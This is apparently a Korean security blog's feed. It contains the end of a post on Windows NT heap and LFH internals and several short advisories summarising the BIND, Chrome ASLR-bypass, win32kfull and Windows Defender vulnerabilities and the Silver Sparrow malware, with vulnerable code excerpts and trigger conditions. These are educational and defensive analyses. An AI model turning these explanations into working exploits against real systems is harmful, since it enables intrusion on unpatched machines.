href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h3><p><code>_HEAP</code>의 <code>BlocksIndex</code>필드에서 참조하는 구조체로 다양한 크기의 해제된 chunk를 관리하는 데 사용되어 Best Fit 정책을 사용하는 NT Heap에서 적절한 chunk를 빠르게 찾을 수 있습니다.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_LIST_LOOKUP 0x000001cd`c8f902e8ntdll!_HEAP_LIST_LOOKUP   +0x000 ExtendedLookup   : 0x000001cd`c8f9ab70 _HEAP_LIST_LOOKUP   +0x008 ArraySize        : 0x80   +0x00c ExtraItem        : 0   +0x010 ItemCount        : 9   +0x014 OutOfRangeItems  : 0   +0x018 BaseIndex        : 0   +0x020 ListHead         : 0x000001cd`c8f90150 _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]   +0x028 ListsInUseUlong  : 0x000001cd`c8f90320  -&gt; 0x18850   +0x030 ListHints        : 0x000001cd`c8f90330  -&gt; (null)</code></pre><ul><li>0x000 ExtendedLookup : 다음 <code>_HEAP_LIST_LOOKUP</code> 구조체를 가리킴</li><li>0x008 ArrySize : chunk의 최대 사이즈 &gt;&gt; 4 로, 설정된 실제 최대 사이즈는 0x800</li><li>0x010 ItemCount : 관리 중인 chunk의 수</li><li>0x014 OutOfRangeItems : 최대 관리 가능한 사이즈를 넘은 chunk의 수</li><li>0x018 BaseIndex : <code>_HEAP_LIST_LOOKUP</code> 에서 관리되는 chunk의 시작 index, ListHint에서 적절한 크기의 해제된 chunk를 찾을 때도 사용됨. 현재 BaseIndex의 최댓값은 다음 BlocksIndex의 BaseIndex</li><li>0x020 ListHead : 해제된 chunk list의 Head</li><li>0x028 ListsInUseUlong : ListHint가 가리키는 chunk들 중 사용 가능한 chunk를 가리킴</li><li>0x030 ListHints : 적절한 크기의 chunk를 빠르게 찾기 위한 Back-End 할당자의 핵심으로 같은 크기의 해제된 chunk list를 가리키는 주소 배열(각 요소는 0x10 size)</li></ul><h2 id="Front-End-Structure"><a href="#Front-End-Structure" class="headerlink" title="Front-End Structure"></a>Front-End Structure</h2><p>Front-End는 Low Fragmentation Heap 과정이며 메모리 할당 및 해제에 직접적으로 관여하지는 않습니다.</p><h3 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h3><p>UserBlock의 header 역할을 하는 구조체이며 XOR 연산으로 인코딩 되어 있습니다. LFH chunk는  <code>_HEAP_ENTRY</code> 의 <code>SubSegmentCode</code> 필드에 인코딩 결괏값을 저장합니다. </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2013.png"></p><pre><code class="hljs c">(SubSegmentCode ^ pLFHKey ^ &amp;_HEAP ^ (&amp;_HEAP_ENTRY &gt;&gt; <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">0xc</span></code></pre><p>의 결괏값이 chunk 주소로부터의 <code>_HEAP_USERDATA_HEADER</code> 오프셋으로, 아래와 같이 확인할 수 있습니다.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2014.png"></p><ul><li>0x000 SubSegment : UserBlock의 SubSegment 주소를 가리킴</li><li>0x018 EncodedOffsets : chunk header의 무결성 검증에 사용됨</li><li>0x020 BusyBitmap : chunk가 사용 중인지를 나타냄</li></ul><h3 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h3><p>LFH chunk를 관리하기 위해 사용되는 구조체이며 <code>_HEAP</code> 의 <code>FrontEndHeap</code> 필드에서 참조합니다.</p><pre><code class="hljs text">0:001&gt; dt _LFH_HEAP 0x000001cd`c8f20000ntdll!_LFH_HEAP   +0x000 Lock             : _RTL_SRWLOCK   +0x008 SubSegmentZones  : _LIST_ENTRY [ 0x000001cd`c8fa30d0 - 0x000001cd`c8fa30d0 ]   +0x018 Heap             : 0x000001cd`c8f90000 Void   +0x020 NextSegmentInfoArrayAddress : 0x000001cd`c8f21140 Void   +0x028 FirstUncommittedAddress : 0x000001cd`c8f22000 Void   +0x030 ReservedAddressLimit : 0x000001cd`c8f3a000 Void   +0x038 SegmentCreate    : 7   +0x03c SegmentDelete    : 0   +0x040 MinimumCacheDepth : 0   +0x044 CacheShiftThreshold : 0   +0x048 SizeInCache      : 0   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES   +0x2a4 Buckets          : [129] _HEAP_BUCKET   +0x4a8 SegmentInfoArrays : [129] (null)    +0x8b0 AffinitizedInfoArrays : [129] (null)    +0xcb8 SegmentAllocator : (null)    +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</code></pre><ul><li><p>0x018 Heap : 현재 _LFH_HEAP 참조하는 _HEAP 구조체의 시작을 가리킴</p></li><li><p>0x2a4 Buckets : 할당 요청된 chunk 크기와 일치하는 메모리 영역 배열</p></li><li><p>0x4a8 SegmentInfoArrays : <code>_HEAP_LOCAL_SEGMENT_INFO</code> 구조체 배열을 가리키며 chunk를 크기별로 각각의 SubSegment로 관리하기 위해 사용됨</p>  <pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))(*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))                 [Type: _HEAP_LOCAL_SEGMENT_INFO * [129]]    [0]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [1]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [2]              : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [3]              : 0x1cdc8f20f00 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [4]              : 0x1cdc8f20fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [5]              : 0x1cdc8f21080 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [6]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]...</code></pre></li><li><p>0xcc0 LocalData : _HEAP_LOCAL_DATA를 가리키며 LFH의 주소를 검색하는 데 사용됨</p></li></ul><h3 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h3><p>LFH가 chunk를 할당할 때 참조하며 Bucket을 관리하기 위해 사용됩니다. <code>_LFH_HEAP</code>의 Buckets 필드에서 참조합니다.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_BUCKET 0x1cdc8f202a4ntdll!_HEAP_BUCKET   +0x000 BlockUnits       : 1   +0x002 SizeIndex        : 0 &#x27;&#x27;   +0x003 UseAffinity      : 0y0   +0x003 DebugFlags       : 0y00   +0x003 Flags            : 0 &#x27;&#x27;</code></pre><ul><li>0x000 BlockUnits : Bucket이 가리키는 chunk의 크기 &gt;&gt; 4</li><li>0x002 SizeIndex : 해당 Bucket의 index값. <code>_LFH_HEAP</code>의 <code>SegmentInfoArrays</code> 배열의 index 값으로도 사용됨</li></ul><h3 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h3><p>SubSegment를 관리하는 구조체이며 <code>_LFH_HEAP</code> 의 <code>SegmentInfoArrays</code> 필드에서 참조합니다.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)                 : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x000] LocalData        : 0x1cdc8f20cc0 [Type: _HEAP_LOCAL_DATA *]    [+0x008] ActiveSubsegment : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x010] CachedItems      [Type: _HEAP_SUBSEGMENT * [16]]    [+0x090] SListHeader      [Type: _SLIST_HEADER]    [+0x0a0] Counters         [Type: _HEAP_BUCKET_COUNTERS]    [+0x0a8] LastOpSequence   : 0x3 [Type: unsigned long]    [+0x0ac] BucketIndex      : 0x2 [Type: unsigned short]    [+0x0ae] LastUsed         : 0x0 [Type: unsigned short]    [+0x0b0] NoThrashCount    : 0x0 [Type: unsigned short]</code></pre><h3 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h3><p>LFH로 할당한 chunk들을 크기별로 관리할 때 사용하는 구조체입니다. <code>_HEAP_LOCAL_SEGMENT_INFO</code>의 <code>ActiveSubsegment</code> 필드와 <code>Cacheditems</code> 필드에서 참조합니다.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)                 : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x000] LocalInfo        : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x008] UserBlocks       : 0x1cdc8fa74e0 [Type: _HEAP_USERDATA_HEADER *]    [+0x010] DelayFreeList    [Type: _SLIST_HEADER]    [+0x020] AggregateExchg   [Type: _INTERLOCK_SEQ]    [+0x024] BlockSize        : 0x3 [Type: unsigned short]    [+0x026] Flags            : 0x0 [Type: unsigned short]    [+0x028] BlockCount       : 0x13 [Type: unsigned short]    [+0x02a] SizeIndex        : 0x2 [Type: unsigned char]    [+0x02b] AffinityIndex    : 0x0 [Type: unsigned char]    [+0x024] Alignment        [Type: unsigned long [2]]    [+0x02c] Lock             : 0x7 [Type: unsigned long]    [+0x030] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]0:001&gt; dx -r1 (*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))(*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))                 [Type: _HEAP_SUBSEGMENT * [16]]    [0]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [1]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [2]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [3]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [4]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [5]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [6]              : 0x0 [Type: _HEAP_SUBSEGMENT *]...</code></pre><ul><li>0x000 LocalInfo : 현재 SubSegment의 <code>_HEAP_LOCAL_SEGMENT_INFO</code> 를 가리킴</li><li>0x008 UserBlock : 현재 SubSegment의 UserBlock(<code>_HEAP_USERDATA_HEADER</code>)를 가리킴</li><li>0x020 AggregateExchg : <code>_INTERLOCK_SEQ</code> 구조체를 참조하며 UserBlock의 해제된 chunk 개수를 나타냄. LFH는 이를 사용하여 Userblock에서 할당해야 하는지 결정함</li><li>0x024 BlockSize : UserBlock의 각 chunk 크기 &gt;&gt; 4</li><li>0x028 BlockCount : UserBlock에 할당된 chunk의 개수</li><li>0x02a SizeIndex : UserBlock에 해당하는 SizeIndex(<code>_HEAP_LOCAL_SEGMENT_INFO</code>의 <code>BucketIndex</code>와 같은 값)</li></ul><h3 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h3><p>할당, 해제된 chunk의 개수를 구할 때 참조하는 구조체입니다. <code>_HEAP_SUBSEGMENT</code>의 <code>AggregateExchg</code> 필드에서  참조합니다.</p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))(*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))                 [Type: _INTERLOCK_SEQ]    [+0x000] Depth            : 0x7 [Type: unsigned short]    [+0x002 (14: 0)] Hint     : 0x2 [Type: unsigned short]    [+0x002 (15:15)] Lock     : 0x0 [Type: unsigned short]    [+0x002] Hint16           : 0x2 [Type: unsigned short]    [+0x000] Exchg            : 131079 [Type: long]</code></pre><ul><li>0x000 Depth : UserBlock에 남아있는 해제 된 청크 개수</li></ul><p>네 이번 글은 여기서 끝입니다. 뭔가 마무리가 찝찝한 것 같죠..? 생각도 못한 구조체 개수로 이번에도 역시나 분량조절에 실패해버렸.. ㅎㅎ;  </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2015.jpg"></p><p>NT Heap의 자세한 memory allocate process는 다음 글에서 소개할 예정이며 폰쿨섹시 시리즈는 다음 글로 돌아오겠습니다!</p><blockquote><p>P.S : 아 그리고 이건 몰래 말씀드리는 건데(속닥) 곧 특별한 게시글이 올라올 예정이니(속닥) 기대해주세요!</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p><p><a href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html</a></p><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8625: Fifteen-year-old RCE bug</title>
    <link href="/2021/02/27/fabu1ous/2021-02-27/"/>
    <url>/2021/02/27/fabu1ous/2021-02-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.thezdi.com/blog/2021/2/24/cve-2020-8625-a-fifteen-year-old-rce-bug-returns-in-isc-bind-server">CVE-2020-8625: A FIFTEEN-YEAR-OLD RCE BUG RETURNS IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>BIND version 9.11 ~ 9.16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>15년 전 ISC BIND 서버에서 4-byte 힙 오버플로우를 악용한 RCE 취약점(CVE-2006-5989)이 발견됐습니다. 해당 취약점에 대한 패치가 merge 되지 않아 방치됐고, 작년(2020년)에 CVE-2020-8625라는 번호로 패치됐습니다. </p><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> der_get_oid(<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">size_t</span> len, oid *data, <span class="hljs-keyword">size_t</span> *size) &#123; <span class="hljs-comment">// ... </span>data-&gt;components = <span class="hljs-built_in">malloc</span>(len * <span class="hljs-keyword">sizeof</span>(*data-&gt;components));   <span class="hljs-comment">// &lt;-- (1) </span>    <span class="hljs-keyword">if</span> (data-&gt;components == <span class="hljs-literal">NULL</span>) &#123;       <span class="hljs-keyword">return</span> (ENOMEM);     &#125;     data-&gt;components[<span class="hljs-number">0</span>] = (*p) / <span class="hljs-number">40</span>;    <span class="hljs-comment">// &lt;-- (2) </span>    data-&gt;components[<span class="hljs-number">1</span>] = (*p) % <span class="hljs-number">40</span>;     --len;               <span class="hljs-comment">// &lt;-- (3) </span>    ++p;     <span class="hljs-keyword">for</span> (n = <span class="hljs-number">2</span>; len &gt; <span class="hljs-number">0U</span>; ++n) &#123;         <span class="hljs-keyword">unsigned</span> u = <span class="hljs-number">0</span>;          <span class="hljs-keyword">do</span> &#123;             --len;             u = u * <span class="hljs-number">128</span> + (*p++ % <span class="hljs-number">128</span>);         &#125; <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0U</span> &amp;&amp; p[<span class="hljs-number">-1</span>] &amp; <span class="hljs-number">0x80</span>);         data-&gt;components[n] = u;      <span class="hljs-comment">// &lt;-- (4) </span>    &#125; <span class="hljs-comment">// ... </span>&#125;</code></pre><p>힙 오버플로우 버그가 존재하는 lib/dns/spnego.c의 함수 <code>der_get_old()</code> 일부입니다. </p><p>(1): 배열형 버퍼를 할당하고 len 변수를 통해 버퍼에 남아있는 element 수를 추적합니다.</p><p>(2): 버퍼에 2개의 element를 담습니다. </p><p>(3): len의 값을 1번만 감소시킵니다.</p><p>(4): 한 개의 int element(4 byte) 만큼 오버플로우가 발생합니다.</p><p>해커는 서버로 조작된 request를 보내 <code>der_get_old()</code>가 할당하는 버퍼의 크기와 그 데이터를 조작할 수 있고, <code>der_get_old()</code>를 호출하는 loop count를 조작할 수 있으므로 연속된 힙 청크의 재할당을 유도해 exploit을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 패치하지 않겠다고 밝힌 Chrome의 garbage collector를 통한 ASLR bypass 취약점</title>
    <link href="/2021/02/26/l0ch/2021-02-26/"/>
    <url>/2021/02/26/l0ch/2021-02-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1144662">Bypassing ASLR using Oilpan’s conservative garbage collector</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google의 오픈소스 브라우저인 Chrome에서 ASLR을 우회해 매핑된 메모리 정보를 유출할 수 있는 취약점의 정보와 PoC가 공개되었습니다.</p><p>Chrome의 V8 엔진은 Oilpan garbage collector를 사용합니다. Oilpan garbage collector는 수집할 포인터를 찾기 위해 스택을 스캔하는데, 정수와 포인터의 형식을 구분하지 않아 정수가 할당된 객체 또한 포인터로 가정해 처리합니다. 이를 이용하면 다음과 같이 임의의 주소에 어떤 객체가 존재하는지 확인할 수 있습니다.</p><ol><li>객체를 할당합니다.</li><li>임의의 주소 값 정수를 스택에 넣습니다.<ul><li>이때 충분한 수의 매개변수를 사용하면 매개 변수용으로 예약된 레지스터를 모두 사용한 뒤 garbage collector가 스캔하는 스택에 나머지 매개 변수가 저장되어 임의의 데이터를 쓸 수 있습니다.</li></ul></li><li>객체에 대한 모든 참조를 제거하고 garbage collection을 트리거합니다.</li><li>객체가 활성화된 상태면 임의의 주소가 대상 객체를 가리킴을 의미합니다.<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/FinalizationRegistry">FinalizationRegistry</a> 를 사용해 객체가 garbage collector에 의해 수집될 때 호출되는 객체에 대한 콜백을 지정하면 객체가 garbage collection이 트리거 된 이후 활성화된 상태인지를 확인할 수 있습니다.</li></ul></li></ol><p>공개된 macOS 버전의 PoC를 실행한 결과는 다음과 같으며 Windows, Linux 등 다른 플랫폼의 Chrome에서도 동일한 취약점이 존재합니다.</p><p><img src="/2021/02/26/l0ch/2021-02-26/image.png"></p><p>그러나 Google 측은 해당 취약점 보고서에 대해 <code>WontFix</code>를 할당했으며 취약점임을 인지하였으나 어떠한 패치나 보상 계획이 없을 것이라고 밝혔습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chrome</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>wontfix</tag>
      
      <tag>garbage collector</tag>
      
      <tag>aslr bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 약 3만 대의 Apple Mac을 감염시킨 Silver Sparrow 악성코드</title>
    <link href="/2021/02/25/idioth/2021-02-25/"/>
    <url>/2021/02/25/idioth/2021-02-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://redcanary.com/blog/clipping-silver-sparrows-wings/">Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Intel x86_64, M1 chips MAC</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple의 새로운 M1 ARM64 아키텍처를 타겟으로 한 악성코드 Silver Sparrow가 발견되었습니다.</p><p>Silver Sparrow는 Intel x86_64 아키텍처를 타겟으로 컴파일된 버전과, Inter x86_64 및 M1 ARM64 아키텍처를 타겟으로 컴파일된 버전이 존재합니다. 두 버전 모두 macOS Installer Javascript API를 활용하여 동적으로 쉘 스크립트를 생성하여 공격 명령을 실행합니다. <code>agent.sh</code> 스크립트는 AWS C2 서버에 설치가 완료되었음을 알리고, <code>verx.sh</code>는 주기적으로 C2 서버에 추가적으로 다운로드하거나 실행할 컨텐츠가 있는지 확인합니다.</p><p>Intel x86_64용 바이너리의 경우, 추가적인 기능 없이 실행 시 “Hello, World!”가 화면에 출력되며, M1 ARM64용 바이너리 또한 “You did it!”을 출력합니다.</p><p>Silver Sparrow는 현재 별다른 기능을 수행하지 않고 있지만, 어떠한 목적을 가지고 있는지 불분명하며 페이로드가 이미 전달되고 제거 되었는지, 향후 추가 배포 일정이 있는지, 악성코드에 의해 어떤 페이로드가 배포되었는지 알 수 있는 방법이 없으며 M1 칩을 타겟으로 잠재적인 공격 가능성이 존재하므로 심각한 위협이라고 밝혔습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>m1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1732: win32kfull.sys 0-day</title>
    <link href="/2021/02/24/fabu1ous/2021-02-24/"/>
    <url>/2021/02/24/fabu1ous/2021-02-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/">WINDOWS KERNEL ZERO-DAY EXPLOIT (CVE-2021-1732) IS USED BY BITTER APT IN TARGETED ATTACK</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows10 1709 ~ 1909 64-bits</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>DBAPPSecurity Threat Intelligence가 작년 12월에 BITTER APT의 새로운 컴포넌트를 분석해 win32kfull.sys에서 발생하는 취약점(CVE-2021-1732)을 발견했습니다. CVE-2021-1732는 win32kfull 콜백에 의해 발생하는 System 권한 상승 취약점으로 IE browser, Adobe Reader 등의 sandbox escape에 사용될 수 있습니다.</p><p>취약점(out-of-bound access)은 <code>win32kfull!xxxCreateWindowEx</code>가 콜백 함수 <code>xxxClientAllocWindowClassExtraBytes</code>를 호출한 후, 커널 구조 멤버에 대한 설정과 flag값이 서로 상응하지 않을 때 발생합니다.</p><p><code>win32kfull!xxxCreateWindowEx</code>가 <code>WndExtra</code> 영역을 갖는 새로운 창을 만들 때 콜백 함수 <code>user32!_xxxClientAllocWindowClassExtraBytes</code>를 호출해 <code>WndExtra</code>를 할당합니다. 그 후 할당된 <code>WndExtra</code>의 유저 모드 포인터를 반환받아 <code>WndExtra</code> 멤버에 저장합니다.</p><p>만약 커스텀 콜백 <code>_xxxClientAllocWindowClassExtraBytes</code>에서 <code>win32kfull!ConsoleControl</code>을 호출해 현재 창에 대한 핸들을 받으면 저장된 <code>WndExtra</code> 멤버를 오프셋으로 변환합니다. 또한 그에 맞게 flag는 현재 멤버가 오프셋임을 나타내도록(0x800) 값이 변경됩니다.</p><p>커스텀 콜백이 끝난 직후 <code>NtCallbackReturn</code>를 통해 임의의 값(fake_offset)을  <code>win32kfull!xxxCreateWindowEx</code>에 반환하면 <code>WndExtra</code> 멤버를  해당 반환 값으로 오염시킬 수 있습니다. 하지만 flag값은 여전히 <code>WndExtra</code> 멤버가 오프셋임을 나타내기 때문에 커널 힙 해제 시 발생하는 분기에 영향을 미치게 됩니다.</p><p><code>win32kfull!xxxFreeWindow</code>는</p><ol><li><p>Flag값 설정됨</p><p>오프셋을 통해 <code>WndExtra</code>를 free 하는 <code>RtlFreeHeap</code> 호출</p></li><li><p>Flag가 설정되지 않음</p><p>유저 모드 포인터와 <code>xxxClientFreeWindowClassExtraBytes</code>를 통해 <code>WndExtra</code>를 free</p></li></ol><p><code>RtlFeeHeap</code>은 Base+offset이 아닌 Base+fake_offset을 free 하게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1647: Windows Defender MpEngine 모듈의 RCE 취약점</title>
    <link href="/2021/02/23/l0ch/2021-02-23/"/>
    <url>/2021/02/23/l0ch/2021-02-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.anquanke.com/post/id/231625">Analysis of CVE-2021-1647 vulnerability exploitation techniques</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Malware Protection Engine ≤ 1.1.17600.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>실제 해커들이 활발하게 악용하고 있는 것으로 확인된 Windows Defender의 원격 코드 실행 취약점의 세부 정보가 공개되었습니다. </p><p>취약점은 Asprotect로 패킹된 PE 파일을 압축 해제하는 <code>CAsprotectDLLAndVersion::RetrieveVersionInfoAndCreateObjects</code> 함수에 존재합니다.</p><pre><code class="hljs c">...<span class="hljs-keyword">for</span> (i = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">28</span>); ; i += <span class="hljs-number">2</span> )&#123;<span class="hljs-keyword">if</span> ( v28 &gt;= <span class="hljs-number">3</span> )v83 = (*((_DWORD *)v2 + <span class="hljs-number">14</span>) + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;sectionindex = i64; v33 = (_DWORD ((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">32</span>); v34 = (__int64) v2 + <span class="hljs-number">32</span>; <span class="hljs-keyword">while</span> ( sectionindex &lt; <span class="hljs-number">4</span> )&#123;<span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFF</span> )<span class="hljs-keyword">goto</span> LABEL_123; <span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &gt; sectionva )&#123;sectionva = *(_DWORD *)(v34 - <span class="hljs-number">4</span>); sectionsize = (*(_DWORD *)v34 + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;&#125;v35 = v82[sectionindex++]; V34 += <span class="hljs-number">8</span>i64; <span class="hljs-keyword">if</span> ( v35 &lt;= v27 )v35 = v27;v27 = v35;&#125;...</code></pre><p>섹션 배열 <code>v2 + 28</code>에는 8 bytes 크기인 4개의 배열 요소가 있습니다. 첫 4 bytes는 섹션의 virtual address를 나타내는 <code>sectionva</code>이며 마지막 4 bytes는 섹션의 크기를 나타내는 <code>sectionsize</code>입니다.  해당 함수는 <code>sectionsize</code>와 <code>sectionva</code> 를 구한 뒤 이 둘을 더한 크기의 메모리를 할당해 압축 해제된 섹션을 저장합니다. 그러나 <code>sectionva</code> 크기가 이전 <code>sectionva</code> 크기와 같은 경우를 고려하지 않아 취약점이 발생합니다.</p><p>섹션 배열이 <code>[0,0], [0,0], [0x2000,0], [0x2000,0x3000]</code> 로 마지막 <code>sectionva</code>와 이전 <code>sectionva</code> 값이 같은 경우 할당된 메모리는 <code>0x2000 + 0 = 0x2000</code> 가 되어 마지막 <code>sectionsize</code>인 <code>0x3000</code> 크기 섹션의 압축을 풀 때 heap overflow가 발생합니다.</p><p>해당 취약점을 악용하면 객체와 포인터 필드를 조작해 arbitrary read/write를 트리거할 수 있고 원격 코드 실행까지 이어질 수 있습니다. 또한 Windows Defender의 파일 스캔 과정에서 트리거 되므로 단순히 해커가 제작한 악성 파일을 다운로드하기만 해도 트리거가 가능한 점에서 심각한 취약점으로 평가되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
